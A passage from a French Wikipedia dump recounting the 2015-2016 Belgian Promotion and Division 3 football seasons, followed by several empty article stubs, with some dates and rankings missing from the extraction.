Knokke qui s'était isolé en tête subit la loi d'Harelbeke ("2-1") lors de la journée puis s'incline de nouveau à Renaix ("1-0") à l'occasion de la . Avec 54 points et 17 victoires, les "Côtiers" doivent concédé le retour d'Harelbeke qu'ils devancent à la différence de buts. Après avoir longtemps mené la série, le SC Dikkelvenne est au troisième rang. Il totalise aussi 54 unités mais avec 16 victoires. Les promus n'ont réalisé qu'un 3 sur 9 avec des partages contre Ninove ("1-1"), à Ingelmunster ("1-1") et contre Harelbeke ("0-0").
Les deux derniers prétendants à la qualification directe sont Westhoek (51-16v) et Berlare (51-15v). Ces deux équipes s'affrontent lors de la journée. Classée , l'Eendracht Zele et ses 47 points ne peut plus se glisser parmi les trois premiers.
Eernegem (18), Damme (15) et Adinkerke (14) sont les trois formations encore en lutte pour éviter la place descendante en provinciale. Adinkerke reçoit Eernegem lors de l'avant-dernière journée.
Dikkelvenne trébuche au pire moment.
Lors de l'avant-dernière journée, Knokke FC et le SW Harelbeke s'imposent et s'assurent l'accès en D2 Amateur car Dikkelvenne trébuche à domicile ("1-2") contre Damme. Celui-ci en profite pour garantir son maintien en "D3 Amateur" car Adinkerke perd contre Eernegem et est condamné à la place.
C'est Westhoek, vainqueur ("1-2") à Berlare, qui s'empare de la marche du podium avec le même nombre de points (54) que Dikkelvenne mais avec une victoire de mieux. Knokke et Harelbeke ont 57 unités mais 2 victoires d'avance sur le quatrième. Westhoek qui termine contre Adinkerke (relégué) devrait assurer sa position.
La dernière journée permet à Knokke (vainqueur "0-3" à Pepingen) d'empocher le premier titre de son Histoire en Promotion (D4). Harelbeke, accroché ("2-2") à St-Gillis/Waas, était certain d'émarger au trio de qualifié. Westhoek décroche le troisième ticket direct pour la D2 Amateur en étrillant ("8-1") le relégué Adinkerke. Les "Rouge et Bleu" n'ont jamais été en danger d'autant que Dikkelvenne s'inclinait ("2-0") à Zele.
Série B.
Résumé - Série B.
Après 6 rencontres, l'Olympic de Charleroi (16) qui revient de , occupe la tête. Au nombre de points perdus, le FC Duffel (13) est à égalité avec les "Dogues" qu'ils reçoivent lors de la journée . C'est Châtelet (12) qui est sur la marche du podium. Les relégués du R. FC Tournai (et de "Ath" (4) sont en difficultés aux et places, alors que les Francs Borains (2) n'ont pas encore de victoire.
Au premier tiers de la compétition, l'Olympic (23) subit son premier revers ("1-2") après une prestation faiblarde contre les "Géants Athois". Les dégâts restent cependant limités pour les Dogues puisque leurs poursuivants directs perdent aussi des plumes. Châtelet (21) est surpris ("0-1") par le Léopold et Duffel (16, "9 matchs joués") à Sterrebeek ("1-0"). Le Racing Charleroi (18) concède un partage ("2-2") contre le RWD Molenbeek (10, "8 matchs joués"). L'US Rebecquoise (19) se hisse sur le podium. Le SK Halle (17) est en embuscade car ayant aussi joué une rencontre de moins. Par contre la situation se complique pour le R. FC Tournai, dernier avec 5 points, soit deux de moins que Waterloo.
Le , Duffel (19) gagne son match de retard au Léopold ("1-3") et remonte sur la marche du podium, grâce à une meilleure différence de buts par rapport à l'US Rebecquoise.
L'Olympic Charleroi, malgré quelques hésitations.
Bien qu'étant moins "tranchant" que durant le premier tour, l'Olympic de Charleroi (50 racole en tête de la série. Fin , les "Dogues", qui viennent de s'incliner ("3-2") au Léopold, comptent 13 unités d'avance sur le classé. Le matricule 246 s'est pourvu en appel d'un forfait infligé à la suite de son déplacement aux Francs Borains (le coach T. Balog ayant refusé puis trop tardé pour quitter sa zone neutre sur ordre de l'arbitre). À 7 matchs théoriques de la fin, la panique ne s'est pas encore emparé des pensionnaires de la Neuville. Duffel et Châtelet (41) sont bien installés sur le podium alors que Sterrebeek (37) est leur premier challenger.
Le dimanche , les Dogues s'imposent ("0-2") au FC Ganshoren et s'assurent le droit de jouer en "Division 2 Amateur" la saison suivante. C'est le clubs à obtenir son billet après le RC Hades ("série C") la veille. Châtelet et Duffel complètent à ce moment le podium alors que le Racing Charleroi est remonté au rang.
Trio carolo ?
Si l'Olympic a dominé la série, ses deux proches voisins n'ont pas été en reste. À deux journées de la fin, Châtelet ("qui n'a plus qu'une partie à jouer") occupe la place avec 50 unités soit 5 de mieux que le Racing CCF classé . C'est Duffel (48) qui est le troisième qualifié direct.
Les trois formations de la région carolorégienne pourraient truster le podium. Une quatrième place ne serait pas catastrophique pour le RCCF car il serait idéalement placé pour un repêchage vers le "tour final francophone". Sterrebeek (43) reste ne lice pour la qualifi' direct alors que l'US Rebecquoise (40) n'est pas encore éliminée de la course à la place.
Duffel et Châtelet accompagnent les "Dogues".
Duffel, qui a étrillé Tournai ("5-1"), et Châtelet, qui ne jouait pas, sont assurés de rejoindre la "D2 Amateur" la saison suivante. Les "Loups" châteletains profitent de la victoire ("2-0") de l'Olympic dans le derby contre le Racing CCF. Malgré cette défaite le "matricule 94" est assuré de terminer " francophone repêchable" dans cette série, car Rebecq s'est incliné ("3-2") au Léopold.
Lors de la dernière journée, l'Olympic ("champion") et Châtelet ("") sont sèchement battus, mais c'est pour l'anecdote. Le Racing CCF s'impose contre Ganshoren et assure sa participation au tour final en compagnie de trois équipes de la "Série D". Battu ("3-1") aux Francs Borains, le RWDM ne profite pas de la défaite du Léopold ("3-0") à Tournai. Ce sont les "Léomen" qui prendront part, avec Rebecq et deux clubs de la "Série D", à un autre tour final pour un éventuel repêchage.
Série C.
Résumé - Série C.
City Pirates et St-Lenaarts (13) occupent la tête après 6 journées, juste devant le duo composé de Pelt et Zwarte Leeuw (12). Le Lyra est mal en point avec un triste "0 sur 18".
Au tiers du championnat, St-Lenaarts (23) est aux commandes malgré un partage concédé chez la lanterne rouge, le Lyra qui empoche son tout premier point. Zwarte Leeuw (19)et Esperanza Pelt (18) complètent le podium, devant Hades (17). En fin de grille, les promus de Nijlen (8) et Lille (7) devancent le Lyra.
À l'occasion des journées à , le FC St-Lenaarts marque le pas en concédant trois défaites de rang. Il s'incline contre Turnhout ("1-2"), à Zwarte Leeuw ("2-0"), puis de nouveau à domicile face à Bilzerse-Waltwilder ("0-1"). C'est le RC Hades (26-8 vict.) qui passe en tête devant Zwarte Leeuw (26-6 vict.). Le Lyra reste dernier malgré un premier succès conquis lors de la journée, ("2-0") contre le FC Lille.
Hades tient bon et coiffe la couronne de "champion d'automne" devant Pelt et Zwarte Leeuw. Tessenderlo s'est glissé au pied du podium aux dépens de City Pirates et St-Lenaarts. Tout bas du classement la situation du Lyra n'est guère enviable. Les Lierrois ont 5 unités de retard sur Vosselaar et Lille.
Hades, bien parti.
À la fin février, le RC Hades semble bien lancé pour gagner le droit de jouer en "D2 Amateur" la saison suivante. le club de la périphérie d'Hasselt compte dix unités d'avance sur le classé, le FC Zwarte Leeuw en perte de vitesse ("1 sur 12"). Olympia Wijgmaal et Tessenderlo, lequel signe un 13 sur 15, complètent le podium. En bas de tableau, le Lyra (10) grappille quelques unités avec des partages, mais reste menacé car, à tour de rôle, Vosselaar ("4-0" contre le leader !), et Lille (19) obtiennent au moins une victoire.
Le samedi , le RC Hades (54) effectue un grand pas vers la qualification pour la "Division 2 Amateur" en allant s'imposer ("1-2") à Spouwen-Mopertingen alors que tous ses rivaux sous la troisième place s'incline. Hades possède 14 unités d'avance sur le K. FC Esperanza Pelt (40) ("classé ") alors qu'il reste 15 points à distribuer. Wijgmaal (46) reste le rival le plus dangereux pour l'attribution du titre de la série.
Le samedi , le RC Hades s'impose aisément ("5-0") contre le K. FC Lille et s'assure le droit de jouer en "Division 2 Amateur" la saison suivante. C'est le tout premier club a validé son billet.
Wijgmaal qualifié, mince répit pour le Lyra.
Malgré des partages à Turnhout ("1-1") et à Bilzerse ("1-1") et un très sec ("3-0") concédé à Esperanza Pelt, Olympia Wijgmaal décroche la qualification pour la "D2 Amateur" au terme de la journée. Les Brabançons (50-14 victoires) possèdent 6 longueurs d'avance sur Zwarte Leeuw (44) et Esperanza Pelt (44) mais ceux-ci n'ont respectivement que 11 et 10 victoires. Tessenderlo occupe le troisième siège qualificatif avec 47 unités et 13 victoires. Turhnout (43), St-Lenaarts et Spouwen-Mopertingen (42) restent mathématiquement concernés, tout comme City Pirates et Leopoldsburg (41-11 victoires).
Un partage ("2-2") obtenu à Lille (20-4 v et -26 buts), lors de la journée, permet au Lyra (14-2v et -44 buts) de conserver un très mince espoir de maintien.
Le Lyra relégué, Tessenderlo et Zwarte Leeuw derniers concernés.
Au terme de l'avant-dernière journée, tout est pratiquement dit dans la série C. Le Lyra est mathématiquement renvoyé en Provinciale, après sa défaite ("3-2") à Wellen. Il ne reste virtuellement plus que deux équipes concernées par la lutte pour le ticket direct pour la "D2 Amateur": Tessenderlo (48-13v-"+24") et Zwarte Leeuw (47-12v-"+9"). St-Lenaarts et Spouwen-Mopertingen (45-12v) restent dans le coup à trois longueurs, mais leur différence de buts respectives ("+14" et "-6") rendent un dépassement de Tessenderlo quasiment impossible.
La dernière journée n'apporte pas de bouleversements. Tessenderlo gagne ("3-0") contre City Pirates Anvers et confirme sa place qualificative pour la "D2 Amateur", rendant inutile le large succès de Zwarte Leeuw ("6-1" contre Spouwen-Mopertingen).
Série D.
Résumé - Série D.
Après 8 journées, Couvin-Mariembourg (18) s'est isolé en tête devant Solières et Arlon (15). C'est la JS Taminoise (4), toujours sans victoire, qui ferme la marche, derrière les promus de Loyers (8).
Des quatre séries de Promotion, c'est la R. Ent. Sp. Couvin-Mariembourg (24) qui est le leader le plus détaché. Les Fagnards, toujours invaincus, comptent sept unités d'avance sur Richelle United ("où ils se rendent lors de la ") et Solières Sport (17). L'UR Namur emmène un trio d'équipes avec 15 points. La JS Taminoise obtient son premier succès ("2-0") contre le FC JL Arlonaise et se relance, derrière Loyers (9), Verlaine et Aywaille (10).
Au soir de la journée , Couvin-Mariembourg (27) porte son avantage à 10 points par rapport à ses premiers poursuivants ("Richelle" et "Solières"). Tamines (10) quitte la dernière place en allant gagner ("0-2") à Loyers (9) qui hérite de la "lanterne rouge".
Le leader Couvin-Mariembourg concède sa première défaite lors de la ("0-2", contre Waremme) mais reste installé au commandes devant son vainqueur et l'US Givry qui effectue une belle remontée jusqu'à la . Loyers (9) est le plus mal loti derrière Aywaille (11).
Couvin-Mariembourg obtient le titre de "champion d'automne" mais voit son avance qui fut un moment de dix longueurs fondre sérieusement. L'US Givry réalise une impressionnante remontée et est deuxième à un point, suivie du Waremme. Longtemps en péril, la JS Taminoise s'éloigne de la zone rouge qu'occupent Verlaine et Aywaille mais surtout Loyers, avec seulement , soit 4 de moins le premier sauvé.
Regroupement et attente d'alignement.
Cette série est celle où le nombre de matchs en retard est le plus important. Après 23 journées, aucun club n'a disputé ce nombre rencontres. On retrouve des formations allant de prestées. C'est ainsi qu'à la fin février, l'UR Namur (22-42) est devant Couvin-Mariembourg (21-41) et Solières (21-38). Meux (21-37) et Waremme (21-35-11v) sont en embuscade avec Givry (21-35-9v). En bas de classement, Bertrix (20-25) qui n'a pourtant joué que s'est éloigné de la zone rouge. La JS Taminoise, victorieuse de Givry ("2-0"), s'est aussi donné de l'air. Verlaine (22-20) et Aywaille (22-19) sont encore couverts par Loyers (22-11).
Loyers relégué, mais suspense à 5 en tête.
Les rencontres d'alignement ne bouleversent pas intégralement la hiérarchie, même si elles permettent à Meux de se hisser dans le « Top 3 ». Couvin-Mariembourg avait du laisser sa première place à la suite d'une défaite ("3-2") à Waremme, mais les « Fagnards » retrouvent leur bien car Meux s'incline ("2-1") dans le derby provincial namurois à Tamines.
Couvin-Mariembourg (55) et Meux (53-17v) occupent les deux premiers sièges directement qualificatifs pour la "D2 Amateur" devant Solières Sport (53-15v, +23 buts). Celui-ci ne devance Givry (53-15v, +22 buts) que d'un petit but. Waremme (51-16v) et l'UR Namur (51-15v) sont les deux derniers prétendant à la qualif' directe.
Dès le , la cause est entendue pour le maintien. Battue ("2-3") par le FC JL Arlonaise, la R. US Loyers est mathématiquement renvoyée en namuroise.
Coup dur pour Couvin-Mariembourg.
En tête pratiquement depuis le début de la compétition, et ayant compté jusqu'à 12 points d'avance, Couvin-Mariembourg concède une défaite ("0-1" contre Bertrix) aux conséquences catastrophiques lors de l'avant-dernière journée. Meux (56-18v), Givry et Solières (56-16v), tous trois vainqueurs, dépassent le club fagnard (55-16v) qui se retrouve écarté des places directes vers la "D2 Amateur". Waremme (54-17v) reste en embuscade alors que Namur (52-15v), qui a partagé ("0-0") à Richelle, est distancé. Couvin termine par un derby à Namur tandis que Meux à Loyers le relégué, Givry contre le Patro Lensois et Solières contre Richelle United ont un programme de clôture en apparence plus facile. De son côté, Waremme reçoit Longlier.
Meux sacré.
La dernière journée, malgré un long suspense, n'entraine pas de chamboulements en haut du tableau. Vainqueur aisé ("0-3") à Loyers, le R. FC Meux décroche le premier titre de son Histoire en séries nationales. Givry dispose sans problème du Patro Lensois ("3-1") pour s'assurer son ticket pour la "D2 Amateur". La situation est plus tendue pour Solières Sport qui est tout le temps accroché (0-0) contre Richelle United. À la fin du temps réglementaire, les "Rouges" sont même dépassés par Couvin-Mariembourg vainqueur ("1-2") à l'UR Namur. Mais un but splendide de Bourard à l'entrée du temps ajouté, soulage le club mosan qui s'impose finalement ("2-0") et décroche la .
Couvin-Mariembourg, Waremme et Namur sont qualifiés pour le tour final. Bertrix et Cointe participeront à un autre tour final pour un éventuel repêchage.
Tour final spécifique.
Au terme de la phase classique un tour final est organisé afin de désigner des qualifiés supplémentaires vers la « D2 Amateur ». Ce tour final est joué distinctement selon l'aile linguistique d'appartenance des clubs puisque la nouvelle D2 Amateur est une division nationale « régionalisée ».
ACFF.
Préambule.
Au niveau de la future « D2 Amateur », une série sera composée de 16 clubs affiliés à l'ACFF ("Association des Clubs Francophones de Football", qui englobe aussi les cercles germanophones). Au terme de la saison 2015-2016, cinq clubs ACFF ayant participé à la "Division 3" sont assurés de faire partie de la "D2 Amateur" (voir Division 3 / Résumé de la saison / Relégation en D2 Amateur).
Au terme de la phase classique du championnat de "Promotion", cinq clubs ACFF ont gagné directement leur qualification pour la "D2 Amateur". Cela porte le nombre de qualifiés à 10 clubs.
Il reste donc 6 places à attribuer. Celles-ci seront attribuées aux cercles ACFF les mieux classés au terme du tour final, mais le nombre final de places est dépendant des performances des trois clubs ACFF engagés dans le tour final de Division 3. En bref, par club ACFF qui gagne sa place en "D1 Amateur", une place supplémentaire se libèrera en D2 Amateur.
Donc avant que ne débutent les tours finaux, trois places sont déjà ouvertes en "D2 Amateur". À l'issue du Premier tour du Tour final des D3, la certitude est acquise que le classé du TF des Promotions est aussi qualifié pour la « D2 Amateur ».
Procédure et Participants.
Le tour final ACFF se déroule en deux parties. La première attribue les places 1 à 4, alors que la seconde désigne les places 5 à 8.
Dans chacune des parties les équipes disputent des demi-finales en une seule manche, sur le terrain de la première équipe tirée au sort. Une consolation et une finale sont ensuite jouées pour obtenir le classement.
Le tirage au sort intégral a été réalisé le lundi , vers 16h00, au siège de l'URBSFA
ACFF - Programme 1 à 4.
Ce tour final "ACFF 1" aura donc été inutile puisque, à la suite des résultats de Premier tour du TF des D3", les 4 premiers classés sont qualifiés pour la "D2 Amateur" !
ACFF - Programme 5 à 8.
Dans le cas de figure où La Louvière décroche son maintien en "D1 Amateur" via le TF des D3, le club classé ("R. Entente Betrigeoise") est qualifié pour la "D2 Amateur".
VFV.
Préambule.
Au niveau de la future "D2 Amateur", deux séries seront composées chacune de 16 clubs affiliés à la VFV ("Voetbal Federatie Vlaanderen, qui regroupe les cercles néerlanddophone). Au terme de la saison 2015-2016, dix-huit clubs VFV ayant participé à la "Division 3" sont assurés de faire partie de la "D2 Amateur" (voir Division 3 / Résumé de la saison / Relégation en D2 Amateur).
Au terme de la phase classique du championnat de "Promotion", sept clubs VFV ont gagné directement leur qualification pour la "D2 Amateur". Cela porte le total de qualifiés à 25.
Il reste donc 7 places à attribuer. Celles-ci seront attribuées aux cercles VFV les mieux classés au terme du tour final, mais le nombre final de places est dépendant des performances des cinq clubs VFV engagés dans le tour final de Division 3 dont au moins deux n'accèderont pas au niveau puisqu'il n'y a que trois places disponibles. En bref, au moins deux clubs VFV resteront en "D2 Amateur" ("3 places vers la D1 Amateur"). Initialement, le nombre de places supplémentaires en D2 Amateur VFV oscille de 2 à 5.
Mais à la suite du premier tour du TF des 3, il ne reste plus que deux cercles néerlandophones en course ("Dender" et "Hasselt"). Cela signifie qu'au moins un club flamand resta en "D1 Amateur" ("si les deux concernés disputent le repêchage"). Le nombre de places ouvertes en "D2 Amateur" est donc au minimum de 3 places pour 4 au maximum. (21 "clubs de D3 +" 7 "venant directement de Promotion =" 28, reste 4 places maximum)
Procédure et Participants.
Le tour final VFV concerne dix clubs. Le tirage au sort des différentes rencontres a été effectué le mardi . La compétition débute par un tour qualificatif joué par quatre formations. Les deux qualifiés les six équipes restantes est disputent le "Premier tour" proprement dit. Viennent ensuite deux journées de matchs de classement de 1 à 4 et de 5 à 8.
Les quatre vainqueurs du "Tour 1" disputent les places 1 à 4, alors que les quatre perdants jouent les places 5 à 8.
VFV - Classement 1 à 4.
Quatre places sont accessibles en D2 Amateur.
Maintien au niveau.
12 clubs ont gagné directement le droit de rester au niveau de la hiérarchie du football belge qui prend le nom de Division 2 Amateur à partir de la saison suivante.
Descente depuis le au niveau.
Au terme de la phase classique, 23 clubs ("18 VFV + 5 ACFF) sont relégués depuis la Division 3 et doivent jouer au niveau qui prend le nom de Division 2 Amateur.
À l'issue d'un tour final à 8, cinq autres clubs seront aussi relégués vers la "D2 Amateur".
Relégations vers le niveau directement inférieur.
36 clubs sont relégués vers le nouveau niveau qui sera créé et appelé "Division 3 Amateur" à partir de la saison suivante. Triés par province, il s'agit de:
Relégations vers les séries provinciales.
8 clubs perdent deux niveaux et se retrouvent en Première provinciale:
Débuts en séries en Promotion.
Un club ayant déjà évolué en séries nationales joue pour la première fois en "Promotion" en tant que D4:
Débuts en séries nationales (et donc en Promotion).
Lors de cette saison 2015-2016, sept clubs font leurs débuts en séries nationales:
À noter que, le Racing White Daring Molenbeek (" club brabançon différent à parvenir en séries nationales, en D4") preste sa première saison en "Promotion" sous sa nouvelle appellation après le rachat du matricule du désormais ex-K. Standaard Wetteren.
Retour en P4.
Au terme de la saison 2015-2016, le Patro Lensois opte pour un retour tout en bas de l'échelle à savoir la provinciale, désormais "niveau 9" de la pyramide.

</doc>
<doc id="8979713" url="https://fr.wikipedia.org/wiki?curid=8979713" title="Warenne">
Warenne



</doc>
<doc id="8979715" url="https://fr.wikipedia.org/wiki?curid=8979715" title="Blanchet (facteurs de clavecin)">
Blanchet (facteurs de clavecin)



</doc>
<doc id="8979717" url="https://fr.wikipedia.org/wiki?curid=8979717" title="Ajivikisme">
Ajivikisme



</doc>
<doc id="8979718" url="https://fr.wikipedia.org/wiki?curid=8979718" title="Esperanza del Corazón">
Esperanza del Corazón



</doc>
<doc id="8979722" url="https://fr.wikipedia.org/wiki?curid=8979722" title="Duvergier de Hauranne">
Duvergier de Hauranne



</doc>
<doc id="8979723" url="https://fr.wikipedia.org/wiki?curid=8979723" title="Exéa">
Exéa



</doc>
<doc id="8979724" url="https://fr.wikipedia.org/wiki?curid=8979724" title="Esprits de Famille">
Esprits de Famille



</doc>
<doc id="8979726" url="https://fr.wikipedia.org/wiki?curid=8979726" title="Gouhier de Petiteville">
Gouhier de Petiteville



</doc>
<doc id="8979728" url="https://fr.wikipedia.org/wiki?curid=8979728" title="Héron de Villefosse">
Héron de Villefosse



</doc>
<doc id="8979731" url="https://fr.wikipedia.org/wiki?curid=8979731" title="La Chevardière de La Grandville">
La Chevardière de La Grandville



</doc>
<doc id="8979734" url="https://fr.wikipedia.org/wiki?curid=8979734" title="Ladreit de Lacharrière">
Ladreit de Lacharrière



</doc>
<doc id="8979735" url="https://fr.wikipedia.org/wiki?curid=8979735" title="La Roche-Aymon">
La Roche-Aymon



</doc>
<doc id="8979736" url="https://fr.wikipedia.org/wiki?curid=8979736" title="Lapparent">
Lapparent



</doc>
<doc id="8979741" url="https://fr.wikipedia.org/wiki?curid=8979741" title="Monier de La Sizeranne">
Monier de La Sizeranne



</doc>
<doc id="8979743" url="https://fr.wikipedia.org/wiki?curid=8979743" title="Championnat de Belgique de football de troisième division 2015-2016">
Championnat de Belgique de football de troisième division 2015-2016

Le championnat de football D3 2015-2016 est la compétition belge de football du national.
Cette saison est la dernière de la Division 3 sous ce vocable et sous la forme qui est la sienne depuis 1952. Cela en raison de la réforme votée le et amenant la réduction de la Division 2 à 8 clubs.
À partir de la saison suivante, le , qui ne comptera plus que 16 formations, devrait prendre le nom de Superligue Amateur.
Réforme de la Division 3.
Le , le projet de réforme avancé par les clubs de Division 1 et de Division 2 a été accepté par la "Commission Nationale d'Études" de l'URBSFA, les séries inférieures doivent s'adapter.
Une incertitude a longtemps plané sur cette adaptation contrainte, mais des bribes de la future réforme des Division 3 et Promotion paraissent petit à petit dans la presse sportive à partir de .
Superligue Amateur "ou" Division 1 Amateur.
Le hiérarchie sera réduit à une seule série que certains dirigeants baptisent "Superligue Amateur" et d'autres "Division 1 Amateur". La première option devrait prévaloir afin d'éviter la confusion avec la Division 1 (Ligue Jupiler)
Cette division comptera 16 clubs pouvant provenir de toutes les communautés (Flandre, "Fédération Wallonie-Bruxelles", Communauté germanophone).
Composition de la Superligue Amateur.
Elle serait composée à la fin de la saison 2015-2016 par:
Une licence spécifique pourrait être nécessaire pour atteindre cette D1 Amateur. Mais les critères d'octroi de ce sésame ne seraient pas encore totalement définis.
Procédure de la Division 3 2015-2016.
Le championnat 2015-2016 se dispute de manière traditionnelle avec les 37 participants répartis en deux séries ("1x 19 + 1x18"). Au sein d'une même série les clubs se rencontrent tous en matchs aller/retour. La série de 19 équipes comptera 36 journées pour un total 36 rencontres pour chaque club. La série de 18 équipes comptera 34 journées pour autant de rencontres disputées par chaque club.
Les deux premiers de chaque série seront qualifiés pour rester au et prendre part à la "Superligue Amateur 2016-2017".
Pas de tour final classique mais un spécifique, pas de barrages.
Le tour final de Division 3 classique instauré en 1993 n'est pas organisé, pas plus que le système de périodes et ses trois classements distincts. Cela puisqu'aucune équipe n'est promue vers le niveau;
Par contre, un « tour final spécifique » à cette saison sera organisé. Dans chaque série, les formations classées de la à la se qualifient pour un tour final spécifique afin de désigner les trois clubs supplémentaires appelés à rester au et à prendre part à la "Superligue Amateur 2016-2017".
Ce tour final particulier se joue en deux tours suivis d'un repêchage. Les huit formations seront opposées lors de quatre matchs à élimination directe. Les quatre qualifiés disputent deux « finales » dont les deux vainqueurs gagnent le droit de rester au et donc en « D1 Amateur ». Les battus des deux finales s'affrontent ensuite pour désigner le et dernier repêché pour la « D1 Amateur ».
Il n'y a pas de « barrages pour le maintien », le dernier de chaque série est renvoyé en « D2 Amateur » ("").
30 relégués.
Les trente autres formations seront reléguées de 1 ou 2 niveaux !
28 équipes au.
Dans chaque série, les équipes classées de la à l'avant-dernière places descendront au , qui devrait prendre le nom de "Division 2 Amateur".
2 équipes au.
Le dernier classé de chaque série sera relégué au , qui devrait prendre le nom de "Division 3 Amateur".
Dossier Eendracht Alost.
Les deux séries de cette saison 2015-2016 sont présentées pour la première fois le par l'URBSFA. À ce moment, il plane encore des incertitudes quant à la participation définitive de certaines formations, mais les choses "rentrent dans l'ordre" avant le début des compétitions. 
L'Eendracht Alost, qui n'a pas reçu sa licence pour le football rémunéré, conteste ce refus et a introduit une action en justice. Le club réclame sa réintégration en Division 2.
Dans l'attente d'une décision, le "matricule 90" est versé dans la "Division 3 - Série A". Le mauvais feuilleton perdure jusqu'au terme de l'entre-saison. Obtenant gain de cause devant un Tribunal des Référés, le club est débouté lors de l'Appel auquel s'est pourvu la fédération.
Disparition de l'AEC Mons.
Déclaré en faillite, le R. AEC Mons devrait disparaître, d'autant qu'un accord a déjà été conclu avec le club de l'R. US Genly-Quevy 89 qui prendra le nom de R. Albert Quevy-Mons à partir du et jouera au stade Tondreau.
Comme pressenti, aucune reprise du "matricule 44" ("versé en Division 3 - Série A" ) ne se produit.
Entente Sportive Acrenoise.
Victorieuse du repêchage lors du Tour final de Promotion 2015, l'Entente Sportive Acrenoise monte en Division 3 car le matricule 44 ("op cit") disparaît.
Clubs participants.
Série A.
Localisations Série A.
Explications abréviations:BOR = K. SV BornemHAM = K. FC Vigor Wuitens HammeLON = K. Londerzeel SKTEM = K. SV TemseSEW = K. VC St-Eloois-Winkel Sport
Classements 2015-2016.
Division 3A.
Classement final.
St-Eloois-Winkel Sport, le Sparta Petegem et Temse n'ayant pas demandé ou obtenu la licence nécessaire, ils glissent en "D2 Amateur". Par ce fait, l'Eendracht Alost (') et l'UR La Louvière Centre (') sont repêchées pour prendre part au tour final offrent trois places en "D1 Amateur".
Division 3B.
Classement final.
La R. UW Ciney s'est classée en ordre utile pour participer au tour final, mais s'est vu refuser la licence nécessaire, même après un recours devant la CBAS . Le club condrusien est remplacé numériquement par le R. FC de Liège ("").
Déroulement de la saison.
Série A.
Au terme des dix premières journées, Dender occupe la tête avec 22 points et une différence de buts de « +19 », juste devant St-Eloois-Winkel (22, +7). C'est le SV Oudenaarde (19) qui complète le podium. Après un bon départ, La Louvière Centre qui occupa un moment la tête, est rentrée dans le rang avec trois défaites de suite et un match remis. En fin de classement, le Racing de Malines et Torhout sont en grandes difficultés avec respectivement 4 et 5 unités.
Lors de la , Oudenaarde remporte le sommet ("1-0") conte St-Eloois-Winkel et passe en tête grâce à une meilleure différence de buts. La Louvière, où Dante Brogno devient « T1 », se replace avec un succès contre Dender alors classé. À l'autre bout du classement le RC Malines retrouve la dernière place à la suite d'une défaite à Torhout ("2-1").
Dender, champion d'Automne.
Dender gagne le sommet de la journée 14 en écartant Oudenaarde ("2-1") pour reprendre la tête, d'autant que St-Eloois-Winkel s'est incliné ("3-2") à Izegem alors classé.
Malgré un partage ("2-2, au RC Gand"), le FC Verbroedering Dender EH (34) garde le cap et s'octroie le titre honorifique de "Champion d'Automne", devant La Louvière (33) et Petegem (32) . St-Eloois-Winkel (31), Temse (31) et Oudenaarde (30) sont en embuscade au pied du podium. Les six premiers sont groupés sur 4 points. Le RC Mechelen (6) ferme la marche deux unités derrière Torhout.
Le mois de janvier 2016 ne change guère la situation. Les équipes du "top 6" perdent des points à tour de rôle et la situation reste indécise. Dender (44) et La Louvière (43) occupent encore les deux premières places, devant Oudenaarde (42) puis Temse et l'Eendracht Alost (41). Le Vigor Hamme (39) effectue une belle remontée et rejoint Petegem (39).
Regroupement en février.
Le mois de se termine avec un regroupement de 8 formations sur 6 points. Le Vigor Hamme signe une sixième victoire d'affiliée pour s'installer en tête avec 48 points et 2 victoires de mieux que Dender. À la suite d'une défaite ("1-2") contre Temse, La Louvière (46-14v) quitte les deux place qualificatives directes et se retrouve ex-aequo avec Londerzeel également auteur d'une belle remontée. Temse et Oudenaarde (45) devancent Alors (44) et Petegem (42) pour lutte au « tour final ». En fond de grille, L'ES Acrenoise (16) obtient un succès important ("3-1") contre St-Niklaas pour sauter Torhout (15), d'autant que le RC de Malines (12) qui a signé un ("2-3" à Petegem) refuse d'abdiquer.
Au soir du , le Vigor Hamme (52) est en tête devant Dender (51) qui profite du partage ("2-2") de Londerzeel (50) à La Louvière (47). Les "Loups", qui suivent Oudenaarde (49) accroché ("2-2") au Racing de Gand, sont devancés à la différence de buts par Temse ("0-0" à Hamme) et sentent le souffle de l'Eendracht Alost (47 et une victoire de moins) qui a obtenu un large succès ("1-5") à l'ES Acrenoise. Celle-ci, Torhout et le RC Malines, soit les trois derniers, restent sur leur position peu enviable.
Hamme tient bon, La Louvière s'enfonce.
À trois journées de la fin, Hamme (61) est un solide leader qui se rapproche de la qualification pour la "D1 Amateur". C'est Sint-Eloois-Winkel (58), auteur d'un 15 sur 15, qui occupe la seconde place qualificative. Londerzeel (55-16v) et Dender (55-15v) sont les deux premiers poursuivants. Ils sont virtuellement assurés d'une participation au « tour final ». Oudenaarde (53) et Temse (50-15v) sont respectivement et . L'Eendracht Alost et le Sparta Petegem (50-14v) sont en embuscade. Par contre, La Louvière (49), qui licencie sont entraineur Dante Brogno après une défaite ("2-0") à Izegem, s'enfonce dangereusement à la suite d'une série de six rencontres sans victoire (3 sur 18). L'accès au "tour final" se complique pour les Loups qui furent un moment leaders. En fond de grille, la situation du RC de Malines (15) ne s'est pas améliorée, le matricule 24 compte toujours quatre unités de moins que l'ES Acrenoise, pour laquelle on évoque un projet de fusion avec la R. AS Lessines-Ollignies .
Le Vigor Hamme qualifié, le RC de Malines reprend espoir.
À l'issue de la , le Vigor Hamme (64), vainqueur ("2-0") du SK St-Niklaas, est assuré de terminer à une des deux premières places et est donc qualifié pour la "D1 Amateur 2016-2017". Sint-Eloois-Winkel (59) qui a réalisé un partage ("0-0") face à Dender (56) conserve le second accessit direct devant son rival du jour. Derrière ce trio, on trouve dans l'ordre: Londerzeel (55-16v) qui a perdu ("2-3") contre Petegem, viennent ensuite Oudenaarde (54), Alost et Petegem (53). Ces deux formations sont à ce moment stricte égalité: points (53), victoires (15) et différence de buts (+12). Les Oignons alostois sont devant car ayant marqué 62 buts pour 59 à son concurrent. Temse (51) et La Louvière (49) voient leur situation se compliquer.
Victorieux ("0-2") à La Louvière, le RC Mechelen reprend espoir en arrivant à 18 points, soit deux de moins que l'ES Acrenoise qui a partagé ("1-1") contre Gullegem. Le "matricule 24" n'aura cependant pas la tâche facile car il doit recevoir Alost et se rendre à Winkel.
Vigor Hamme champion, Oudenaarde placé, Deux-Acren lanterne rouge, Alost et La Louvière chanceux.
